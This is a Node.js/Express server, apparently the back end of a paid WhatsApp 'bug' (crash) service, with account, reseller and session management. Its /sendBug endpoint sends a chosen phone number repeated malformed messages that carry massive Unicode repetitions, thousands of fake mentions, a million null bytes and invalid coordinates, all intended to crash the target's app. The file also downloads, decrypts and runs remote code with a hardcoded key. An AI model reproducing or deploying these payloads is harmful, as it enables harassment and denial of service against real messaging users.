    if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
    
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    
    if (!user) {
        return res.json({ valid: false, message: "User tidak ditemukan" });
    }
    
    if (user.password !== oldPassword) {
        return res.json({ valid: false, message: "Password lama salah" });
    }
    
    if (!newPassword || newPassword.length < 3) {
        return res.json({ valid: false, message: "Password baru minimal 3 karakter" });
    }
    
    user.password = newPassword;
    saveDatabase(db);
    
    res.json({ valid: true, message: "Password berhasil diubah" });
});

app.post("/validate", (req, res) => {
const { username, password, version, androidId } = req.body;

if (!androidId) {
  return res.json({ valid: false, message: "androidId required" });
}

const db = loadDatabase();
const user = db.find(u => u.username === username && u.password === password);

if (!user) return res.json({ valid: false });

if (isExpired(user)) {
  return res.json({ valid: true, expired: true });
}

const keyList = loadKeyList();
const existingSession = keyList.find(e => e.username === username);
if (existingSession && existingSession.androidId !== androidId) {
  console.log(`[📱] Device login baru, override session untuk ${username}`);
}

const key = generateKey();
activeKeys[key] = {
  username,
  created: Date.now(),
  expires: Date.now() + 24 * 60 * 60 * 1000,
};

recordKey({
  username,
  key,
  role: user.role || 'member',
  ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
  androidId,
});

// ✅ HEARTBEAT: mulai tracking user sebagai Online
try { startUserHeartbeat(username, androidId, key); } catch(e) { console.error('[HB] startUserHeartbeat error:', e.message); }

return res.json({
  valid: true,
  expired: false,
  key,
  expiredDate: user.expiredDate,
  role: user.role || "member",
  listBug: bugs,
  news
});
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  // ✅ Trigger Heartbeat segera setelah sukses validasi (Auto Login)
  try {
    startUserHeartbeat(username, androidId, key);
  } catch(e) {
    console.error('[HB] startUserHeartbeat error:', e.message);
  }

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, "");
  console.log(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  const roleCooldowns = {
    member: 300,
    reseller: 240,
    reseller1: 60,
    owner: 0,
    vip: 60,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`)
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);
  console.log(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  setImmediate(async () => {
    const isMessBug = false;
    console.log("Received Signal")
    const attemptSend = async (sock, retry = false) => {
      try {
        const targetJid = target + "@s.whatsapp.net";
    console.log("Received Signal 2")
    console.log(`${targetJid}`)
        switch (bug) {
          case "click":
            for (let i = 0; i < 15; i++) {
              await fconemsg(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "android":
            for (let i = 0; i < 20; i++) {
              await urlloc(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "invisible":
            for (let i = 0; i < 200; i++) {
              await VnXNewDenglayHardInpis(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "ios_invis":
            for (let i = 0; i < 1; i++) {
              await iosTrashLocExtend(sock, targetJid);
            }
            break;
          case "ios_noinvis":
            for (let i = 0; i < 15; i++) {
              await iOSxTend(sock, targetJid);
            }
            break;
        }

        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
        }
        if (!retry) {
          const retrySock = await checkActiveSessionInFolder(user.username);
          if (retrySock) return await attemptSend(retrySock, true);
        }
        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}`);
        return false;
      }
    };

    const sock = await checkActiveSessionInFolder(user.username);
    if (!sock) {
      console.warn(`[❌ NO SOCK] Tidak ada koneksi ${isMessBug ? 'Messenger' : 'aktif'} tersedia.`);
      return;
    }

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
          sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  console.log(user.username)
  return res.json({
    valid: true,
    connections: conns
  });
});

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
  const sessionDir = path.join('permenmd', user.username, number); 

  if (!fs.existsSync(`permenmd/${user.username}`)) fs.mkdirSync(`permenmd/${user.username}`);
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number}...`);
        await waiting(3000);
        await pairingWa(number, user.username);
      } else {
        delete activeConnections[number];
      }
    }
  });
  if (!sock.authState.creds.registered) {
    await waiting(1000);
    let code = await sock.requestPairingCode(number);
    console.log(code)
    if (code) {
      return res.json({ valid: true, number, pairingCode: code });
    } else {
      return res.json({ valid: false, message: "Already registered or failed to get code" });
    }
  }
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "reseller1"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  saveDatabase(db);
    
    sendToGroups(
      `✅ *Akun Baru Dibuat*\nUsername: ${newAccount.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newAccount.role}`,
        { parse_mode: "Markdown" }
    );

  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", (req, res) => {
    const { key, username } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
    
    const db = loadDatabase();
    const deleter = db.find(u => u.username === keyInfo.username);
    const deleterRole = deleter?.role || 'member';
    
    const targetUser = db.find(u => u.username === username);
    if (!targetUser) {
        return res.json({ valid: false, deleted: false, message: "User tidak ditemukan" });
    }
    
    // Cek permission delete
    if (deleterRole !== 'owner') {
        // Non-owner hanya bisa delete user dengan role lebih rendah
        if (getRoleLevel(targetUser.role) >= getRoleLevel(deleterRole)) {
            return res.json({
                valid: false,
                deleted: false,
                message: `${deleterRole} tidak bisa menghapus ${targetUser.role}`
            });
        }
    }
    
    const deletedUser = { ...targetUser };
    const index = db.findIndex(u => u.username === username);
    db.splice(index, 1);
    saveDatabase(db);
    
    sendToGroups(
        `🗑️ *Akun Dihapus*\nUsername: ${deletedUser.username}\nDihapus Oleh: ${deleter.username}\nRole: ${deletedUser.role}`,
        { parse_mode: "Markdown" }
    );
    
    const logLine = `${deleter.username} Deleted ${username}\n`;
    fs.appendFileSync('logUser.txt', logLine);
    
    res.json({
        valid: true,
        deleted: true,
        user: {
            username: deletedUser.username,
            role: deletedUser.role
        }
    });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ============ ONLINE USERS & ACTIVE CONNECTIONS ENDPOINTS ============

// ✅ ENDPOINT STATS — tanpa butuh session key, pakai username+password
// Khusus untuk dashboard app supaya selalu bisa fetch walau key expired
app.get("/stats", (req, res) => {
    const { username, password } = req.query;

    // Validasi user via database langsung (tidak butuh session key)
    try {
        const db = loadDatabase();
        const user = db.find(u => u.username === username && u.password === password);
        if (!user) return res.status(401).json({ valid: false, message: "Wrong credentials" });

        const onlineUsers = loadOnlineUsers();
        const activeConns = loadActiveConnections();
        const now = Date.now();

        const onlineNow = onlineUsers.filter(u => (now - new Date(u.lastActive).getTime()) < 60000);
        const activeNow  = activeConns.filter(c => (now - new Date(c.lastActive).getTime()) < 60000);

        return res.json({
            valid: true,
            onlineUsers: onlineNow.length,
            activeConnections: activeNow.length,
            users: onlineNow,
            connections: activeNow,
        });
    } catch(e) {
        return res.status(500).json({ valid: false, message: e.message });
    }
});

app.get("/onlineUsers", (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    const onlineUsers = loadOnlineUsers();
    const activeNow = onlineUsers.filter(u => {
        const lastActive = new Date(u.lastActive);
        return (Date.now() - lastActive) < 60000;
    });
    
    res.json({ 
        valid: true, 
        onlineUsers: activeNow,
        total: activeNow.length 
    });
});

app.post("/updateOnlineUser", (req, res) => {
    const { key, username, androidId } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    const onlineUsers = loadOnlineUsers();
    const existing = onlineUsers.findIndex(u => u.username === username);
    const userData = {
        username: username,
        androidId: androidId,
        lastActive: new Date().toISOString(),
        role: keyInfo.role || 'member'
    };
    
    if (existing !== -1) {
        onlineUsers[existing] = userData;
    } else {
        onlineUsers.push(userData);
    }
    
    saveOnlineUsers(onlineUsers);
    res.json({ valid: true });
});

app.post("/removeOnlineUser", (req, res) => {
    const { key, username } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    // ✅ HEARTBEAT: stop timer + hapus dari list
    try { stopUserHeartbeat(username); } catch(e) {}
    
    res.json({ valid: true });
});

app.get("/activeConnections", (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    const activeConns = loadActiveConnections();
    const activeNow = activeConns.filter(c => {
        const lastActive = new Date(c.lastActive);
        return (Date.now() - lastActive) < 60000;
    });
    
    res.json({ 
        valid: true, 
        activeConnections: activeNow,
        total: activeNow.length 
    });
});

app.post("/updateActiveConnection", (req, res) => {
    const { key, sessionName, type } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    const activeConns = loadActiveConnections();
    const existing = activeConns.findIndex(c => c.sessionName === sessionName);
    const connData = {
        sessionName: sessionName,
        type: type || 'unknown',
        owner: keyInfo.username,
        lastActive: new Date().toISOString()
    };
    
    if (existing !== -1) {
        activeConns[existing] = connData;
    } else {
        activeConns.push(connData);
    }
    
    saveActiveConnections(activeConns);
    res.json({ valid: true });
});

app.post("/removeActiveConnection", (req, res) => {
    const { key, sessionName } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    let activeConns = loadActiveConnections();
    activeConns = activeConns.filter(c => c.sessionName !== sessionName);
    saveActiveConnections(activeConns);
    res.json({ valid: true });
});

// ============ ROOM PUBLIC CHAT ENDPOINTS ============

app.get("/chat/messages", (req, res) => {
    const { key, limit = 100 } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    const messages = loadChatMessages();
    const limited = messages.slice(-parseInt(limit));
    
    res.json({ 
        valid: true, 
        messages: limited,
        total: messages.length 
    });
});

app.post("/chat/send", (req, res) => {
    const { key, message, username } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    if (!message || message.trim().length === 0) {
        return res.json({ valid: false, error: "Message cannot be empty" });
    }
    
    if (message.length > 500) {
        return res.json({ valid: false, error: "Message too long (max 500 chars)" });
    }
    
    const messages = loadChatMessages();
    const newMessage = {
        id: Date.now().toString(),
        username: username || keyInfo.username,
        message: message.substring(0, 500),
        timestamp: new Date().toISOString(),
        role: keyInfo.role || 'member'
    };
    
    messages.push(newMessage);
    saveChatMessages(messages);
    
    broadcastToChatClients({
        type: 'new_message',
        message: newMessage
    });
    
    res.json({ valid: true, message: newMessage });
});

app.delete("/chat/delete/:id", (req, res) => {
    const { key } = req.query;
    const { id } = req.params;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    
    if (!user || user.role !== 'owner') {
        return res.status(403).json({ valid: false, error: "Only owner can delete messages" });
    }
    
    let messages = loadChatMessages();
    messages = messages.filter(m => m.id !== id);
    saveChatMessages(messages);
    
    broadcastToChatClients({
        type: 'delete_message',
        messageId: id
    });
    
    res.json({ valid: true });
});

app.get("/chat/online-users", (req, res) => {
    const { key } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    const onlineUsers = loadOnlineUsers();
    const activeNow = onlineUsers.filter(u => {
        const lastActive = new Date(u.lastActive);
        return (Date.now() - lastActive) < 60000;
    });
    
    res.json({ 
        valid: true, 
        users: activeNow,
        total: activeNow.length 
    });
});

app.post("/chat/online", (req, res) => {
    const { key, username } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    let onlineUsers = loadOnlineUsers();
    const existing = onlineUsers.findIndex(u => u.username === username);
    
    if (existing !== -1) {
        onlineUsers[existing].lastActive = new Date().toISOString();
    } else {
        onlineUsers.push({
            username: username,
            lastActive: new Date().toISOString(),
            role: keyInfo.role || 'member'
        });
    }
    
    saveOnlineUsers(onlineUsers);
    
    broadcastToChatClients({
        type: 'user_online',
        username: username,
        users: onlineUsers.filter(u => (Date.now() - new Date(u.lastActive)) < 60000).length
    });
    
    res.json({ valid: true });
});

app.post("/chat/offline", (req, res) => {
    const { key, username } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.status(401).json({ valid: false });
    
    let onlineUsers = loadOnlineUsers();
    onlineUsers = onlineUsers.filter(u => u.username !== username);
    saveOnlineUsers(onlineUsers);
    
    broadcastToChatClients({
        type: 'user_offline',
        username: username,
        users: onlineUsers.length
    });
    
    res.json({ valid: true });
});

app.get("/listUsers", (req, res) => {
    const { key, filterRole } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
    
    const db = loadDatabase();
    const requester = db.find(u => u.username === keyInfo.username);
    const requesterRole = requester?.role || 'member';
    
    // Filter berdasarkan role yang boleh dilihat
    let users = db;
    
    if (requesterRole === 'member') {
        // Member hanya lihat diri sendiri
        users = db.filter(u => u.username === requester.username);
    } else if (requesterRole === 'reseller') {
        // Reseller lihat member & diri sendiri
        users = db.filter(u => u.role === 'member' || u.username === requester.username);
    } else if (requesterRole === 'admin') {
        // Admin lihat member, reseller, & diri sendiri
        users = db.filter(u => ['member', 'reseller'].includes(u.role) || u.username === requester.username);
    } else if (requesterRole === 'partner') {
        // Partner lihat member, reseller, admin, & diri sendiri
        users = db.filter(u => ['member', 'reseller', 'admin'].includes(u.role) || u.username === requester.username);
    }
    // Owner lihat semua
    
    if (filterRole) {
        users = users.filter(u => u.role === filterRole);
    }
    
    res.json({
        valid: true,
        authorized: true,
        users: users.map(u => ({
            username: u.username,
            expiredDate: u.expiredDate,
            role: u.role || 'member',
            parent: u.parent || 'SYSTEM'
        })),
        total: users.length,
        myRole: requesterRole
    });
});

app.get("/userAdd", (req, res) => {
    const { key, username, password, role, day } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
    
    const db = loadDatabase();
    const creator = db.find(u => u.username === keyInfo.username);
    const creatorRole = creator?.role || 'member';
    
    const targetRole = role || 'member';
    
    // Cek permission create
    if (!canCreateRole(creatorRole, targetRole)) {
        return res.json({
            valid: false,
            authorized: false,
            message: `${creatorRole} tidak bisa membuat role ${targetRole}`
        });
    }
    
    // Cek limit durasi untuk reseller
    if (creatorRole === "reseller" && parseInt(day) > 30) {
        return res.json({
            valid: false,
            created: false,
            invalidDay: true,
            message: "Reseller hanya bisa membuat akun maksimal 30 hari"
        });
    }
    
    if (db.find(u => u.username === username)) {
        return res.json({ valid: false, created: false, message: "Username sudah ada" });
    }
    
    const expired = new Date();
    expired.setDate(expired.getDate() + parseInt(day));
    
    const newUser = {
        username: username,
        password: password,
        role: targetRole,
        expiredDate: expired.toISOString().split("T")[0],
        parent: creator.username,
        createdAt: new Date().toISOString()
    };
    
    db.push(newUser);
    saveDatabase(db);
    
    sendToGroups(
        `✅ *Akun Baru Dibuat*\nUsername: ${newUser.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newUser.role}`,
        { parse_mode: "Markdown" }
    );
    
    const logLine = `${creator.username} Created ${username} role ${targetRole} duration ${day}\n`;
    fs.appendFileSync('logUser.txt', logLine);
    
    res.json({
        valid: true,
        authorized: true,
        created: true,
        user: {
            username: newUser.username,
            role: newUser.role,
            expiredDate: newUser.expiredDate,
            parent: newUser.parent
        }
    });
});

app.get("/editUser", (req, res) => {
    const { key, username, addDays, newRole } = req.query;
    
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });
    
    const db = loadDatabase();
    const editor = db.find(u => u.username === keyInfo.username);
    const editorRole = editor?.role || 'member';
    
    const targetUser = db.find(u => u.username === username);
    if (!targetUser) {
        return res.json({ valid: false, edited: false, message: "User tidak ditemukan" });
    }
    
    // Cek permission edit
    if (editorRole !== 'owner') {
        if (getRoleLevel(targetUser.role) >= getRoleLevel(editorRole)) {
            return res.json({
                valid: false,
                edited: false,
                message: `${editorRole} tidak bisa mengedit ${targetUser.role}`
            });
        }
    }
    
    // Edit expired date
    if (addDays && parseInt(addDays) > 0) {
        if (editorRole === "reseller" && parseInt(addDays) > 30) {
            return res.json({
                valid: false,
                edited: false,
                message: "Reseller hanya bisa menambah maksimal 30 hari"
            });
        }
        
        const currentDate = new Date(targetUser.expiredDate);
        currentDate.setDate(currentDate.getDate() + parseInt(addDays));
        targetUser.expiredDate = currentDate.toISOString().split("T")[0];
    }
    
    // Edit role (hanya owner yang bisa)
    if (newRole && editorRole === 'owner') {
        if (canCreateRole(editorRole, newRole)) {
            targetUser.role = newRole;
        } else {
            return res.json({
                valid: false,
                edited: false,
                message: `Tidak bisa mengubah role ke ${newRole}`
            });
        }
    }
    
    saveDatabase(db);
    
    const logLine = `${editor.username} Edited ${username} AddDays ${addDays || 0} NewRole ${newRole || targetUser.role}\n`;
    fs.appendFileSync('logUser.txt', logLine);
    
    res.json({
        valid: true,
        authorized: true,
        edited: true,
        user: {
            username: targetUser.username,
            role: targetUser.role,
            expiredDate: targetUser.expiredDate
        }
    });
});

app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

async function VnXNewDenglayHardInpis(sock, target) {
    let vnxmbg = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: "#VnXNew - By @Raffioffci5",
              mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from(
                {
                  length: 2000,
                },
                () =>
                  '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
              ),
            ],
            body: {
              text: "VnX Is Here",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"VnX","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\u0000".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
       },
      },
    };

   await sock.relayMessage(target, vnxmbg, { 
    participant: { jid: target } 
  });
}

async function fconemsg(sock, target) {
  try {
    const VisiLoad = "꧀".repeat(25000);
    await sock.relayMessage(target, {
      productMessage: {
        product: {
          productImage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQNVJiaPtq4Sbf8CxOoOzzjG0MhQfcEYp5a3RFKcWBSVcbpL-t5yDfR0nH5aJAUinpDS6rCsfN--747mOTiF-oaiO97W41SndL8DiveF6w?ccb=9-4&oh=01_Q5Aa3AE1L5Iz4vV7dLKJBsOGPtCrs08G_-y0L0rO6KMSMEj4rg&oe=694A1259&_nc_sid=e6ed6c&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "DqRi9X3lEDH7WJSqb6E1njeawZZkIg8DTHZgdIga+E8=",
            fileLength: "72103",
            mediaKey: "Mt4oRen73PaURrUvv9vLJTPNBQoUlbNNtVr4D7FziAw=",
            fileEncSha256: "okpg3oYPwe/ndLcMdIPy0gtyYl/wvC9WurHeekXWTOk=",
            directPath: "/o1/v/t24/f2/m232/AQNVJiaPtq4Sbf8CxOoOzzjG0MhQfcEYp5a3RFKcWBSVcbpL-t5yDfR0nH5aJAUinpDS6rCsfN--747mOTiF-oaiO97W41SndL8DiveF6w?ccb=9-4&oh=01_Q5Aa3AE1L5Iz4vV7dLKJBsOGPtCrs08G_-y0L0rO6KMSMEj4rg&oe=694A1259&_nc_sid=e6ed6c",
            mediaKeyTimestamp: "1763881206",
            width: -99999999999999999999, 
            height: 1,
            jpegThumbnail: null,
            productId: "9783476898425051",
            title: "OCEAN MODS " + VisiLoad,
            description: "UI MODS" + VisiLoad, 
            currencyCode: "IDR",
            priceAmount1000: "X",
            retailerId: "BAN011",
            productImageCount: 2,
            salePriceAmount1000: "50000000"
          }
        },
        businessOwnerJid: target
      }
    }, { participant: { jid: target } });
    await new Promise(resolve => setTimeout(resolve, 50000));
    let VoidTeam = "X - TEAM";
    let MyTeam = "ြ".repeat(1500);
    const PayCrash = {
      requestPaymentMessage: {
        currencyCodeIso4217: 'IDR',
        requestFrom: target, 
        expiryTimestamp: Date.now() + 8000, 
        amount: {
          value: 999999999, 
          offset: 100, 
          currencyCode: 'IDR'
        },
        contextInfo: {
          externalAdReply: {
            title: VoidTeam,
            body: MyTeam,
            mimetype: 'audio/mpeg',
            caption: MyTeam,
            showAdAttribution: true,
            sourceUrl: 'https://t.me/aboutvils',
            thumbnailUrl: 'https://files.catbox.moe/tpoa34.jpg'
          }
        }
      }
    };
    await sock.relayMessage(target, PayCrash, {
      participant: { jid: target },
      messageId: null,
      userJid: target,
      quoted: null
    });
  } catch (error) {
    console.error("error:", error);
  }
}

async function urlloc(client, target) { 
  const triggerUI = "ꦾ".repeat(61111);
  await client.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 99999e99999,
        degreesLongitude: -99999e99999,
        name: "‼️⃟ ༚ ./rãldzavgrs.   " + triggerUI,
        inviteLinkGroupTypeV2: "DEFAULT",
        merchantUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        url: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        thumbnailUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        waWebSocketUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        mediaUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        sourceUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        originalImageUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
        clickToWhatsappCall: true,
        contextInfo: {
          remoteJid: `${"@s.whatsapp.net"}`,
          participant: "13135550002@s.whatsapp.net",
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING"
          },
          externalAdReply: {
            quotedAd: {
              advertiserName: triggerUI,
              mediaType: "IMAGE",
